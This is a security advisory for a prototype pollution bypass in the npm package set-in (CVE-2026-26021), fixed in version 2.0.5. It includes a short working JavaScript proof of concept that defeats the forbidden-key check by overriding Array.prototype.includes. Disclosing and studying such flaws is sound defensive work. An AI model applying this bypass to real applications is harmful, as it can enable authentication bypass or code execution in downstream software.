# [C] set-in Affected by Prototype Pollution

## Summary
Severity: Critical
Advisory: GHSA-2c4m-g7rx-63q7
CVE: CVE-2026-26021
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-02-11
Source: https://github.com/advisories/GHSA-2c4m-g7rx-63q7
Type: github-advisory

## Affected
- npm: `set-in` — affected >=2.0.1 <2.0.5

## Details
### Summary
A prototype pollution vulnerability exists in the the npm package set-in (>=2.0.1). Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute Object.prototype via a crafted input using Array.prototype. This has been fixed in version 2.0.5.

### Details
The vulnerability resides in line 28 of https://github.com/ahdinosaur/set-in/blob/master/index.js where includes() function is used to check whether user provided input contain forbidden strings.

### PoC
#### Steps to reproduce
1. Install latest version of set-in using npm install or cloning from git
2. Run the following code snippet:

```javascript
Array.prototype.includes = () => false; 
const si = require('set-in');
const obj = {};
console.log({}.polluted);
si(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');  // prints yes -> indicating that the patch was bypassed and prototype pollution occurred
```

#### Expected behavior
Prototype pollution should be prevented and {} should not gain new properties.
This should be printed on the console:
```
undefined
undefined OR throw an Error
```

#### Actual behavior
Object.prototype is polluted
This is printed on the console:
```
undefined 
yes
```

### Impact
This is a prototype pollution vulnerability, which can have severe security implications depending on how set-in is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.
It could potentially lead to the following problems:
1. Authentication bypass
2. Denial of service
3. Remote code execution (if polluted property is passed to sinks like eval or child_process)

## References
- https://github.com/ahdinosaur/set-in/security/advisories/GHSA-2c4m-g7rx-63q7
- https://nvd.nist.gov/vuln/detail/CVE-2026-26021
- https://github.com/ahdinosaur/set-in/pull/6
- https://github.com/ahdinosaur/set-in/commit/34842cc02de3fd65d6f8bd0b268347e7b390125b
- https://github.com/ahdinosaur/set-in/commit/6bad255961d379e4b1f5fbc52ef9dc8420816f24
- https://github.com/ahdinosaur/set-in/commit/b8e1dabfdbd35c8d604b6324e01d03f280256c3d
- https://github.com/ahdinosaur/set-in/commit/d87c1a09fa2edb55cd76440a67d83d1cb828df11
- https://github.com/ahdinosaur/set-in
